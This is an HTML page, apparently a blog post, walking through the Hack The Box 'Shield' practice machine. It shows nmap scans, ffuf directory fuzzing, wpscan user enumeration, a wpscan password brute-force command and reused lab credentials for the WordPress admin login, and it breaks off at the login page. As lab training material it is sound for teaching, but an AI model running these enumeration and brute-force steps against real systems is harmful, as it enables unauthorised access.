@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html ⚡>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+    <title>Shield Walkthrough</title>
+
+    <link rel="icon" href="../../favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="../index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    
+    <meta property="og:site_name" content="h4rithd.com" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Shield Walkthrough" />
+    <meta property="og:description" content="After the Vaccine Walkthrough, here I&#x27;m with Shield box. Let&#x27;s hack and grab the flags. As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be rooted in sequence. So it means, if you need to go through this box, first of" />
+    <meta property="og:url" content="http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/" />
+    <meta property="og:image" content="http://192.168.8.3:2368/content/images/2021/05/4.jpg" />
+    <meta property="article:published_time" content="2021-04-30T22:08:00.000Z" />
+    <meta property="article:modified_time" content="2021-05-26T22:24:23.000Z" />
+    <meta property="article:tag" content="h4rithd" />
+    <meta property="article:tag" content="HackTheBox" />
+    <meta property="article:tag" content="HarithDilshan" />
+    <meta property="article:tag" content="HTB Walkthrough" />
+    <meta property="article:tag" content="HTB Writeup" />
+    <meta property="article:tag" content="StartingPoint" />
+    <meta property="article:tag" content="Writeup" />
+    <meta property="article:tag" content="Shield Walkthrough" />
+    <meta property="article:tag" content="Shield" />
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ShapManasick" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Shield Walkthrough" />
+    <meta name="twitter:description" content="After the Vaccine Walkthrough, here I&#x27;m with Shield box. Let&#x27;s hack and grab the flags. As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be rooted in sequence. So it means, if you need to go through this box, first of" />
+    <meta name="twitter:url" content="http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/" />
+    <meta name="twitter:image" content="http://192.168.8.3:2368/content/images/2021/05/4.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Harith Dilshan" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="h4rithd, HackTheBox, HarithDilshan, HTB Walkthrough, HTB Writeup, StartingPoint, Writeup, Shield Walkthrough, Shield" />
+    <meta name="twitter:site" content="@h4rithd" />
+    <meta property="og:image:width" content="1920" />
+    <meta property="og:image:height" content="1182" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "h4rithd.com",
+        "url": "http://192.168.8.3:2368/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://192.168.8.3:2368/content/images/2021/05/my.png",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Harith Dilshan",
+        "image": {
+            "@type": "ImageObject",
+            "url": "http://192.168.8.3:2368/content/images/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg",
+            "width": 2000,
+            "height": 2000
+        },
+        "url": "http://192.168.8.3:2368/author/harith/",
+        "sameAs": []
+    },
+    "headline": "Shield Walkthrough",
+    "url": "http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/",
+    "datePublished": "2021-04-30T22:08:00.000Z",
+    "dateModified": "2021-05-26T22:24:23.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://192.168.8.3:2368/content/images/2021/05/4.jpg",
+        "width": 1920,
+        "height": 1182
+    },
+    "keywords": "h4rithd, HackTheBox, HarithDilshan, HTB Walkthrough, HTB Writeup, StartingPoint, Writeup, Shield Walkthrough, Shield",
+    "description": "After the Vaccine Walkthrough, here I&#x27;m with Shield box. Let&#x27;s hack and grab the\nflags.\n\n\n--------------------------------------------------------------------------------\n\nAs I mentioned before, the starting point machines are a series of 9 easily\nrated machines that should be rooted in sequence. So it means, if you need to go\nthrough this box, first of all you must have a complete Vaccine\n[/@shapmanasick/s/starting-point-htb/vaccine-walkthrough]machine.\n\nEnough talks, 🥱 Let’s Get It Started 🐱",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://192.168.8.3:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.6" />
+    <link rel="alternate" type="application/rss+xml" title="h4rithd.com" href="../../rss/index.html" />
+
+    <style amp-custom>
+    *,
+    *::before,
+    *::after {
+        box-sizing: border-box;
+    }
+
+    html {
+        overflow-x: hidden;
+        overflow-y: scroll;
+        font-size: 62.5%;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+    }
+
+    body {
+        min-height: 100vh;
+        margin: 0;
+        padding: 0;
+        color: #3a4145;
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        font-size: 1.7rem;
+        line-height: 1.55em;
+        font-weight: 400;
+        font-style: normal;
+        background: #fff;
+        scroll-behavior: smooth;
+        overflow-x: hidden;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
+
+    p,
+    ul,
+    ol,
+    li,
+    dl,
+    dd,
+    hr,
+    pre,
+    form,
+    table,
+    video,
+    figure,
+    figcaption,
+    blockquote {
+        margin: 0;
+        padding: 0;
+    }
+
+    ul[class],
+    ol[class] {
+        padding: 0;
+        list-style: none;
+    }
+
+    img {
+        display: block;
+        max-width: 100%;
+    }
+
+    input,
+    button,
+    select,
+    textarea {
+        font: inherit;
+        -webkit-appearance: none;
+    }
+
+    fieldset {
+        margin: 0;
+        padding: 0;
+        border: 0;
+    }
+
+    label {
+        display: block;
+        font-size: 0.9em;
+        font-weight: 700;
+    }
+
+    hr {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 1px;
+        border: 0;
+        border-top: 1px solid currentcolor;
+        opacity: 0.1;
+    }
+
+    ::selection {
+        text-shadow: none;
+        background: #cbeafb;
+    }
+
+    mark {
+        background-color: #fdffb6;
+    }
+
+    small {
+        font-size: 80%;
+    }
+
+    sub,
+    sup {
+        position: relative;
+        font-size: 75%;
+        line-height: 0;
+        vertical-align: baseline;
+    }
+    sup {
+        top: -0.5em;
+    }
+    sub {
+        bottom: -0.25em;
+    }
+
+    ul li + li {
+        margin-top: 0.6em;
+    }
+
+    a {
+        color: var(--ghost-accent-color, #1292EE);
+        text-decoration-skip-ink: auto;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+        margin: 0;
+        font-weight: 700;
+        color: #121212;
+        line-height: 1.4em;
+    }
+
+    h1 {
+        font-size: 3.4rem;
+        line-height: 1.1em;
+    }
+
+    h2 {
+        font-size: 2.4rem;
+        line-height: 1.2em;
+    }
+
+    h3 {
+        font-size: 1.8rem;
+    }
+
+    h4 {
+        font-size: 1.7rem;
+    }
+
+    h5 {
+        font-size: 1.6rem;
+    }
+
+    h6 {
+        font-size: 1.6rem;
+    }
+
+    amp-img {
+        height: 100%;
+        width: 100%;
+        max-width: 100%;
+        max-height: 100%;
+    }
+
+    amp-img img {
+        object-fit: cover;
+    }
+
+    .page-header {
+        padding: 50px 5vmin 30px;
+        text-align: center;
+        font-size: 2rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .page-header a {
+        color: #121212;
+        font-weight: 700;
+        text-decoration: none;
+        font-size: 1.6rem;
+        letter-spacing: -0.1px;
+    }
+
+    .post {
+        max-width: 680px;
+        margin: 0 auto;
+    }
+
+    .post-header {
+        margin: 0 5vmin 5vmin;
+        text-align: center;
+    }
+
+    .post-meta {
+        margin: 1rem 0 0 0;
+        text-transform: uppercase;
+        color: #738a94;
+        font-weight: 500;
+        font-size: 1.3rem;
+    }
+
+    .post-image {
+        margin: 0 0 5vmin;
+    }
+
+    .post-image img {
+        display: block;
+        width: 100%;
+        height: auto;
+    }
+
+    .post-content {
+        padding: 0 5vmin;
+    }
+
+    .post-content > * + * {
+        margin-top: 1.5em;
+    }
+
+    .post-content [id]:not(:first-child) {
+        margin: 2em 0 0;
+    }
+
+    .post-content > [id] + * {
+        margin-top: 1rem;
+    }
+
+    .post-content [id] + .kg-card,
+    .post-content blockquote + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content > ul,
+    .post-content > ol,
+    .post-content > dl {
+        padding-left: 1.9em;
+    }
+
+    .post-content hr {
+        margin-top: 40px;
+    }
+
+    .post .post-content hr + * {
+        margin-top: 40px;
+    }
+
+    .post-content amp-img {
+        background-color: #f8f8f8;
+    }
+
+    .post-content blockquote {
+        position: relative;
+        font-style: italic;
+    }
+
+    .post-content blockquote::before {
+        content: "";
+        position: absolute;
+        left: -1.5em;
+        top: 0;
+        bottom: 0;
+        width: 0.3rem;
+        background: var(--ghost-accent-color, #1292EE);
+    }
+
+    .post-content :not(.kg-card):not([id]) + .kg-card {
+        margin-top: 40px;
+    }
+
+    .post-content .kg-card + :not(.kg-card) {
+        margin-top: 40px;
+    }
+
+    .kg-card figcaption {
+        padding: 1.5rem 1.5rem 0;
+        text-align: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.4em;
+        opacity: 0.6;
+    }
+
+    .kg-card figcaption strong {
+        color: rgba(0,0,0,0.8);
+    }
+
+    .post-content :not(pre) code {
+        vertical-align: middle;
+        padding: 0.15em 0.4em 0.15em;
+        border: #e1eaef 1px solid;
+        font-weight: 400;
+        font-size: 0.9em;
+        line-height: 1em;
+        color: #15171a;
+        background: #f0f6f9;
+        border-radius: 0.25em;
+    }
+
+    .post-content > pre {
+        overflow: scroll;
+        padding: 16px 20px;
+        color: #fff;
+        background: #1F2428;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
+    }
+
+    .kg-embed-card {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+    }
+
+    .kg-image-card img {
+        margin: auto;
+    }
+
+    .kg-gallery-card + .kg-gallery-card {
+        margin-top: 0.75em;
+    }
+
+    .kg-gallery-container {
+        position: relative;
+    }
+
+    .kg-gallery-row {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+    }
+
+    .kg-gallery-image {
+        width: 100%;
+        height: 100%;
+    }
+
+    .kg-gallery-row:not(:first-of-type) {
+        margin: 0.75em 0 0 0;
+    }
+
+    .kg-gallery-image:not(:first-of-type) {
+        margin: 0 0 0 0.75em;
+    }
+
+    .kg-bookmark-card,
+    .kg-bookmark-publisher {
+        position: relative;
+    }
+
+    .kg-bookmark-container,
+    .kg-bookmark-container:hover {
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: row-reverse;
+        color: currentColor;
+        background: rgba(255,255,255,0.6);
+        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
+        text-decoration: none;
+        border-radius: 5px;
+        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
+        overflow: hidden;
+    }
+
+    .kg-bookmark-content {
+        flex-basis: 0;
+        flex-grow: 999;
+        padding: 20px;
+        order: 1;
+    }
+
+    .kg-bookmark-title {
+        font-weight: 600;
+        font-size: 1.5rem;
+        line-height: 1.3em;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        max-height: 45px;
+        margin: 0.5em 0 0 0;
+        font-size: 1.4rem;
+        line-height: 1.55em;
+        overflow: hidden;
+        opacity: 0.8;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+    }
+
+    .kg-bookmark-metadata {
+        margin-top: 20px;
+    }
+
+    .kg-bookmark-metadata {
+        display: flex;
+        align-items: center;
+        font-weight: 500;
+        font-size: 1.3rem;
+        line-height: 1.3em;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .kg-bookmark-description {
+        display: -webkit-box;
+        -webkit-box-orient: vertical;
+        -webkit-line-clamp: 2;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-metadata amp-img {
+        width: 18px;
+        height: 18px;
+        max-width: 18px;
+        max-height: 18px;
+        margin-right: 10px;
+    }
+
+    .kg-bookmark-thumbnail {
+        display: flex;
+        flex-basis: 20rem;
+        flex-grow: 1;
+        justify-content: flex-end;
+    }
+
+    .kg-bookmark-thumbnail amp-img {
+        max-height: 200px;
+    }
+
+    .kg-bookmark-author {
+        white-space: nowrap;
+        text-overflow: ellipsis;
+        overflow: hidden;
+    }
+
+    .kg-bookmark-publisher::before {
+        content: "•";
+        margin: 0 .5em;
+    }
+
+    .kg-width-full.kg-card-hascaption {
+        display: grid;
+        grid-template-columns: inherit;
+    }
+
+    .post-content table {
+        border-collapse: collapse;
+        width: 100%;
+    }
+
+    .post-content th {
+        padding: 0.5em 0.8em;
+        text-align: left;
+        font-size: .75em;
+        text-transform: uppercase;
+    }
+
+    .post-content td {
+        padding: 0.4em 0.7em;
+    }
+
+    .post-content tbody tr:nth-child(2n + 1) {
+        background-color: rgba(0,0,0,0.1);
+        padding: 1px;
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td:last-child {
+        box-shadow:
+            inset 1px 0 rgba(0,0,0,0.1),
+            inset -1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:nth-child(2n + 2) td {
+        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
+    }
+
+    .post-content tbody tr:last-child {
+        border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+
+    .page-footer {
+        padding: 60px 5vmin;
+        margin: 60px auto 0;
+        text-align: center;
+        background-color: #f8f8f8;
+    }
+
+    .page-footer h3 {
+        margin: 0.5rem 0 0 0;
+    }
+
+    .page-footer p {
+        max-width: 500px;
+        margin: 1rem auto 1.5rem;
+        font-size: 1.7rem;
+        line-height: 1.5em;
+        color: rgba(0,0,0,0.6)
+    }
+
+    .powered {
+        display: inline-flex;
+        align-items: center;
+        margin: 30px 0 0;
+        padding: 6px 9px 6px 6px;
+        border: rgba(0,0,0,0.1) 1px solid;
+        font-size: 12px;
+        line-height: 12px;
+        letter-spacing: -0.2px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        font-weight: 500;
+        color: #222;
+        text-decoration: none;
+        background: #fff;
+        border-radius: 6px;
+    }
+
+    .powered svg {
+        height: 16px;
+        width: 16px;
+        margin: 0 6px 0 0;
+    }
+
+    @media (max-width: 600px) {
+        body {
+            font-size: 1.6rem;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+        }
+    }
+
+    @media (max-width: 400px) {
+        h1 {
+            font-size: 2.6rem;
+            line-height: 1.15em;
+        }
+        h2 {
+            font-size: 2rem;
+            line-height: 1.2em;
+        }
+        h3 {
+            font-size: 1.7rem;
+        }
+    }
+
+    :root {--ghost-accent-color: #006ac7;}
+    </style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    
+
+</head>
+
+<body class="amp-template">
+    <header class="page-header">
+        <a href="../../index.html">
+                <amp-img class="site-icon" src="http://192.168.8.3:2368/content/images/2021/05/hnet.com-image.ico" width="50" height="50" layout="fixed"></amp-img>
+        </a>
+    </header>
+
+    <main class="content" role="main">
+        <article class="post">
+
+            <header class="post-header">
+                <h1 class="post-title">Shield Walkthrough</h1>
+                <section class="post-meta">
+                    Harith Dilshan -
+                    <time class="post-date" datetime="2021-05-01">01 May 2021</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="http://192.168.8.3:2368/content/images/2021/05/4.jpg" width="600" height="340" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
+
+                <p>After the Vaccine Walkthrough, here I'm with Shield box. Let's hack and grab the flags.</p><hr></hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="http://192.168.8.3:2368/@shapmanasick/s/starting-point-htb/vaccine-walkthrough">Vaccine </a>machine.</p><p>Enough talks, 🥱 Let’s Get It Started 🐱‍💻</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! 🐱‍👤</blockquote><hr></hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine …</h2><p>To start machine, just click "Join Machine".</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-39.png" class="kg-image" alt width="1637" height="730" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-39.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-39.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-39.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-39.png 1637w" layout="responsive"></amp-img></figure><p>Then you can see the <strong>IP </strong>address for that machine. Usually it is <code><strong>10.10.10.29 </strong></code><strong>🤠</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma8rCTSABTSH_XeG1Vi%2F-Ma8ssSW-inIrWZ0ACd2%2Fimage.png?alt=media&amp;token=b3e10e07-6b98-4526-a81c-461351c2569b" class="kg-image" alt width="444" height="485" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Before going enumeration steps we can simply ping to the IP address and check our VPN connection and whether the machine is alive. Sometimes the machines might "Disable" ping requests from passing through the firewall. But in most cases ping will be a success! 🙂</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# ping 10.10.10.29 -c 2
+PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
+64 bytes from 10.10.10.29: icmp_seq=1 ttl=127 time=235 ms
+64 bytes from 10.10.10.29: icmp_seq=2 ttl=127 time=242 ms
+
+--- 10.10.10.29 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1003ms
+rtt min/avg/max/mdev = 234.989/238.250/241.512/3.261 ms</code></pre><blockquote>As a ping result, It's TTL=127. There is only one route between machine and us (VPN). So definitely it will be a Windows machine.</blockquote><hr></hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First …</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.29</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
+-vv	: Extra verbosity
+--open	: Output only open ports
+-p-	: Full TCP ports range (65535)
+-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output 👇</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.29
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 09:11 EDT
+Initiating Ping Scan at 09:11
+Scanning 10.10.10.29 [4 ports]
+Completed Ping Scan at 09:11, 0.30s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 09:11
+Scanning 10.10.10.29 [65535 ports]
+Discovered open port 3306/tcp on 10.10.10.29
+Discovered open port 80/tcp on 10.10.10.29
+SYN Stealth Scan Timing: About 6.12% done; ETC: 09:19 (0:07:56 remaining)
+SYN Stealth Scan Timing: About 14.99% done; ETC: 09:18 (0:05:46 remaining)
+SYN Stealth Scan Timing: About 24.54% done; ETC: 09:17 (0:04:40 remaining)
+SYN Stealth Scan Timing: About 32.52% done; ETC: 09:17 (0:04:11 remaining)
+SYN Stealth Scan Timing: About 39.61% done; ETC: 09:17 (0:03:50 remaining)
+SYN Stealth Scan Timing: About 53.18% done; ETC: 09:17 (0:02:39 remaining)
+SYN Stealth Scan Timing: About 70.11% done; ETC: 09:16 (0:01:30 remaining)
+Completed SYN Stealth Scan at 09:15, 253.94s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.29
+Host is up, received echo-reply ttl 127 (0.22s latency).
+Scanned at 2021-05-20 09:11:32 EDT for 254s
+Not shown: 65533 filtered ports
+Reason: 65533 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE REASON
+80/tcp   open  http    syn-ack ttl 127
+3306/tcp open  mysql   syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 254.38 seconds
+           Raw packets sent: 131239 (5.774MB) | Rcvd: 170 (7.464KB)</code></pre><p>Really? There are only two ports open. 😑😑😶</p><h3 id="%E2%80%8C012-run-nmap-scripting-engine">‌01.2 Run Nmap Scripting Engine</h3><p>To get the best result, We can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# nmap -sV -sC -oN DetailPorts.nmap -p 80,3306 10.10.10.29
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 09:27 EDT
+Nmap scan report for 10.10.10.29
+Host is up (0.23s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds</code></pre><p>There are 2 main ports. One is running webserver and other one is running MySQL server. 🤷‍♂️🤷‍♂️</p><h3 id="013-discover-more-on-port-80">01.3 Discover more on port 80</h3><p>🕵️‍♀️ Now we have only two open ports, so I chose port 80 first. Now you have a pretty big idea about what we need to do with port 80 right? Let's open our web browser, type 10.10.10.29 and then hit enter.</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-40.png" class="kg-image" alt width="1354" height="747" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-40.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-40.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-40.png 1354w" layout="responsive"></amp-img></figure><p><br />What the hell! Feel like there are more steps, 😖 Now we need to find whether there are any other directories here?</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-41.png" class="kg-image" alt width="236" height="177" layout="fixed"></amp-img></figure><p><br />Again it's time to start fuzzing. I have already told you how to use <a href="https://app.gitbook.com/@shapmanasick/s/starting-point-htb/oopsie-walkthrough#02-foothold"><code>dirsearch</code></a>tool in <a href="https://app.gitbook.com/@shapmanasick/s/starting-point-htb/oopsie-walkthrough">oopsie </a>walkthrough. Now it's time to learn a new cool tool right. 😍😎 The tool is <a href="https://github.com/ffuf/ffuf" rel="noopener noreferrer"><code>ffuf</code></a>. A fast web fuzzer written in Go.</p><blockquote>You can download and install this tool by reading <a href="https://github.com/ffuf/ffuf#installation" rel="noopener noreferrer">this</a>. It must be installed on your OS if you are willing to face OSCP. Because it helps a lot more than ordinary <a href="https://tools.kali.org/web-applications/wfuzz" rel="noopener noreferrer"><code>Wfuzz</code></a>tool.</blockquote><p>Let's enumerate the web directories!!</p><pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.29/FUZZ</code></pre><p>Here is the output. 👇👇</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.29/FUZZ        
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.2.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.29/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+                        [Status: 200, Size: 703, Words: 27, Lines: 32]
+wordpress               [Status: 301, Size: 152, Words: 9, Lines: 2]
+:: Progress: [4614/4614] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:33] :: Errors: 0 ::</code></pre><p>So we have only one directory and it is wordpress. Let's jump to our web browser and navigate to the <code>http://10.10.10.29/wordpress</code></p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-42.png" class="kg-image" alt width="1353" height="741" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-42.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-42.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-42.png 1353w" layout="responsive"></amp-img></figure><p><br />Now you can see there is a wordpress site hosted on the server. So now, time to use <code>wpscan </code>tool. By using this tool we can do lots of things on Wordpress CMS like enumerating plugins, users, themes, backups and also we can use this tool to brute force wordpress passwords.</p><pre><code class="language-bash">wpscan --url http://10.10.10.29/wordpress -e u</code></pre><p>Here is the output. 👇👇</p><pre><code class="language-bash">┌──(root💀Hidd3nWiki)-[~/Documents/Shield]
+└─# wpscan --url http://10.10.10.29/wordpress -e u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.14
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.10.29/wordpress/ [10.10.10.29]
+[+] Started: Thu May 20 10:33:23 2021
+
+  &lt;snap&gt;
+  ............
+  &lt;/snap&gt;
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Thu May 20 10:33:31 2021
+[+] Requests Done: 13
+[+] Cached Requests: 42
+[+] Data Sent: 3.559 KB
+[+] Data Received: 9.893 KB
+[+] Memory used: 122.016 MB
+[+] Elapsed time: 00:00:08</code></pre><p>So as you can see there is only one user called <code>admin</code> in this wordpress site. Let's brute force that user using rockyou password.</p><pre><code class="language-bash">wpscan --url http://10.10.10.29/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt</code></pre><p>But wait, ✋✋</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma8rCTSABTSH_XeG1Vi%2F-Ma9Pbupd4vbukgizp1h%2Fimage.png?alt=media&amp;token=05b1b1e8-042d-42e7-84f6-e05912141401" class="kg-image" alt width="735" height="701" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br />Password brute forcing is more time consuming here. Since these boxes are in sequence, we can check previous credentials. 🙄🙄 in vaccine walkthrough we had found some passwords, if you check one by one you will get the right one. here it is <code>P@s5w0rd! </code>  So the credentials for wordpress login are</p><p><code>admin : P@s5w0rd!</code></p><p>And if you are not familiar with wordpress sites, <code>/wp-admin</code> is the login page for most of the wordpress sites and it is the default login path. bla bla bala...</p><p>Anyway go to your browser again and navigate to<code>http://10.10.10.29/wordpress/wp-admin</code> . Now you are end up at login page.</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-43.png" class="kg-image" alt width="1349" height="706" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-43.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-43.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-43.png 1349w" 